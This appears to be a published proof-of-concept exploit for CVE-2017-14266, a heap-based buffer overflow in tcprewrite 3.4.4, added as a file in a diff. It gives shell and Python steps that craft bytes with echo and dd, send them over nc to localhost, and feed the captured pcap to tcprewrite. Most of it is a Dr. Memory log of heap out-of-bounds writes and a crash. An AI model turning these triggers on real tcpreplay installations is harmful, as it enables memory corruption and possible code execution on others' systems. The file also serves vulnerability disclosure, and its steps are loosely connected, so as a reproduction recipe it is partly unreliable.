@@ -1,0 +1,83 @@
+################
+#Title: tcprewrite Heap-Based Buffer Overflow
+#CVE: CVE-2017-14266
+#CWE: CWE-122
+#Exploit Author: Hosein Askari(FarazPajohan)
+#Vendor HomePage: http://tcpreplay.synfin.net/
+#Product Description: When you want to give a PCAP file to someone, it gives away certain sensitive information such as an organizations internal IP range,
+IP addresses of sensitive company assets, MAC addresses of critical hardware that could identify the product vendors. Tcprewrite is a security tool to rewrite packets stored
+in PCAP file format, such as created by tools such as tcpdump and ethereal.
+#Version : 3.4.4 Released under the Free BSD License
+#Tested on: Ubuntu 16.04 (Linux 4.4.0-93-generic)
+#Date: 11-09-2017
+#Category: Application
+#Author Mail : hosein.askari@aol.com
+#Description: tcprewrite in Tcpreplay 3.4.4 has a Heap-Based Buffer Overflow vulnerability triggered by a crafted PCAP file can cause a memory corruption and potential code execution.
+###############
+#First we make a crafted file and send it to the network and capture its information by wireshark.
+~Step 1:
+sudo echo -ne '\x63\x72\x61\x66\x74\x65\x64\x20\x66\x69\x6c\x65\x20\x69\x73\x20\x6d\x61\x64\x65\x20\x62\x79\x20\x48\x6f\x73\x65\x69\x6e\x20\x41\x73\x6b\x61\x72\x69' | dd conv=notrunc bs=1000 seek=200 of=tcp3.txt
+~Step 2(Sending the information and capturing by wireshark):
+import os
+for i in range(1,20):
+        os.system("cat tcp3.txt | nc 127.0.0.1 21")
+~Step 3(Using tcprewrite):
+sudo  tcprewrite --portmap=21:2121 --infile=tcp.pcap --outfile=output.pcap
+################
+#POC:
+constantine@constantine:~/Downloads/DrMemory-Linux-1.11.0-2/bin$ sudo ./drmemory -- tcprewrite --portmap=21:2121 --infile=tcp.pcap --outfile=output.pcap
+~~Dr.M~~ Dr. Memory version 1.11.0
+~~Dr.M~~ WARNING: application is missing line number information.
+~~Dr.M~~
+~~Dr.M~~ Error #1: UNADDRESSABLE ACCESS beyond heap bounds: writing 0x080d458f-0x080d4590 1 byte(s) within 0x080d458c-0x080d4590
+~~Dr.M~~ # 0 replace_memcpy               [/work/drmemory_package/drmemory/replace.c:246]
+~~Dr.M~~ # 1 tcprewrite!?                +0x0      (0x0804ae59 <tcprewrite+0x2e59>)
+~~Dr.M~~ # 2 tcprewrite!?                +0x0      (0x08049f91 <tcprewrite+0x1f91>)
+~~Dr.M~~ # 3 tcprewrite!?                +0x0      (0x0804a1a1 <tcprewrite+0x21a1>)
+~~Dr.M~~ Note: @0:00:01.045 in thread 2521
+~~Dr.M~~ Note: next higher malloc: 0x080d45b0-0x080e45af
+~~Dr.M~~ Note: instruction: mov    %eax -> (%ebx)
+~~Dr.M~~
+~~Dr.M~~ Error #2: UNADDRESSABLE ACCESS beyond heap bounds: writing 0x080d459c-0x080d459d 1 byte(s)
+~~Dr.M~~ # 0 replace_memcpy               [/work/drmemory_package/drmemory/replace.c:252]
+~~Dr.M~~ # 1 tcprewrite!?                +0x0      (0x0804ae59 <tcprewrite+0x2e59>)
+~~Dr.M~~ # 2 tcprewrite!?                +0x0      (0x08049f91 <tcprewrite+0x1f91>)
+~~Dr.M~~ # 3 tcprewrite!?                +0x0      (0x0804a1a1 <tcprewrite+0x21a1>)
+~~Dr.M~~ Note: @0:00:01.047 in thread 2521
+~~Dr.M~~ Note: next higher malloc: 0x080d45b0-0x080e45af
+~~Dr.M~~ Note: instruction: mov    %dl -> (%eax)
+~~Dr.M~~
+~~Dr.M~~ Error #3: UNADDRESSABLE ACCESS beyond heap bounds: reading 0x080d458f-0x080d4591 2 byte(s) within 0x080d458d-0x080d4591
+~~Dr.M~~ # 0 libc.so.6!__GI___mempcpy              [../sysdeps/i386/i686/multiarch/../mempcpy.S:54]
+~~Dr.M~~ # 1 libc.so.6!__GI__IO_default_xsputn     [/build/glibc-KM3i_a/glibc-2.23/libio/genops.c:438]
+~~Dr.M~~ # 2 libc.so.6!_IO_new_file_xsputn         [/build/glibc-KM3i_a/glibc-2.23/libio/fileops.c:1352]
+~~Dr.M~~ # 3 libc.so.6!__GI__IO_fwrite             [/build/glibc-KM3i_a/glibc-2.23/libio/iofwrite.c:39]
+~~Dr.M~~ # 4 libpcap.so.0.8!pcap_dump             +0x5f     (0xb79f1100 <libpcap.so.0.8+0x1d100>)
+~~Dr.M~~ # 5 tcprewrite!?                         +0x0      (0x0804adc6 <tcprewrite+0x2dc6>)
+~~Dr.M~~ # 6 tcprewrite!?                         +0x0      (0x08049f91 <tcprewrite+0x1f91>)
+~~Dr.M~~ # 7 tcprewrite!?                         +0x0      (0x0804a1a1 <tcprewrite+0x21a1>)
+~~Dr.M~~ Note: @0:00:01.071 in thread 2521
+~~Dr.M~~ Note: next higher malloc: 0x080d45b0-0x080e45af
+~~Dr.M~~ Note: instruction: rep movs %ds%esi) %esi %edi %ecx -> %es%edi) %esi %edi %ecx
+~~Dr.M~~
+~~Dr.M~~ Error #4: LEAK 8 direct bytes 0x080c3168-0x080c3170 + 0 indirect bytes
+~~Dr.M~~ # 0 replace_malloc               [/work/drmemory_package/common/alloc_replace.c:2576]
+~~Dr.M~~ # 1 tcprewrite!?                +0x0      (0x08059e6c <tcprewrite+0x11e6c>)
+~~Dr.M~~ # 2 tcprewrite!?                +0x0      (0x0804ea21 <tcprewrite+0x6a21>)
+~~Dr.M~~ # 3 tcprewrite!?                +0x0      (0x0804c264 <tcprewrite+0x4264>)
+~~Dr.M~~ # 4 tcprewrite!?                +0x0      (0x08049e0c <tcprewrite+0x1e0c>)
+~~Dr.M~~ # 5 tcprewrite!?                +0x0      (0x0804a1a1 <tcprewrite+0x21a1>)
+<Application /usr/bin/tcprewrite (2521).  Dr. Memory internal crash at PC 0x7384d6d5.  Please report this at http://drmemory.org/issues.  Program aborted.
+Received SIGSEGV at client library pc 0x7384d6d5 in thread 2521
+Base: 0xb7e25000
+Registers:eax=0x00000000 ebx=0x73934a30 ecx=0x00000002 edx=0x739355c0
+esi=0x4b200ba8 edi=0x00000006 esp=0x4a0c6814 ebp=0x00000000
+eflags=0x000102
+1.11.0-2-(Aug 29 2016 02:45:30)0
+-no_dynamic_options -disasm_mask 8 -logdir '/home/constantine/Downloads/DrMemory-Linux-1.11.0-2/drmemory/logs/dynamorio' -client_lib '/home/constantine/Downloads/DrMemory-Linux-1.11.0-2/bin/release/libdrmemorylib.so;0;-logdir `/home/constantine/Downloads/DrMemory-Linux-1.11.0-2/drmemory/logs` -symcache_dir `/home/constan
+/home/constantine/Downloads/DrMemory-Linux-1.11.0-2/bin/release/libdrmemorylib.so=0x73800000
+/usr/lib/i386-linux-gnu/libstdc++.so.6=0xb7c84000
+/lib/i386-linux-gnu/libgcc_s.so.1=0xb7a33000
+/lib/i386-linux-gnu/libm.so.6=0xb7c2e000
+/lib/i386-linux-gnu/libc.so.6=0xb7a77000
+/lib/ld-linux.so.2=0xb7a51000>
